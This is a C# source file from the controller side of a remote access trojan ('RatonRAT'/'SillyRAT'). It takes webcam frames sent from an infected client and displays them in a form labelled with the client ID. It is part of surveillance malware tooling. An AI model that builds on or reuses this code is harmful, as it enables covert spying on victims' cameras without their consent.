using Stuff;
using RatonRAT.ClientForms;
using Server.Connection;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using SillyRAT;
using System;
using System.Drawing;

namespace Server.Handlers
{
    internal class HandleWebcam
    {
        public HandleWebcam(SillyClient SillyClient, Unpack unpack)
        {
            string formname = "Webcam | Client ID: ";
            FormWebcam webcamForm = (FormWebcam)Application.OpenForms[formname + unpack.GetAsString("UID")];

            if (webcamForm != null && !webcamForm.IsDisposed)
            {
                if (webcamForm.SillyClient == null)
                {
                    webcamForm.SillyClient = SillyClient;
                }

                webcamForm.Invoke(new MethodInvoker(() =>
                {
                    byte[] imageBytes = unpack.GetAsByteArray("Image");
                    if (imageBytes != null)
                    {
                        using (MemoryStream ms = new MemoryStream(imageBytes))
                        {
                            var image = System.Drawing.Image.FromStream(ms);
                            if (webcamForm.pictureBox1 != null && !webcamForm.pictureBox1.IsDisposed)
                            {
                                webcamForm.pictureBox1.Image = image;
                                webcamForm.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                            }
                        }
                    }
                }));
            }
        }
    }
}
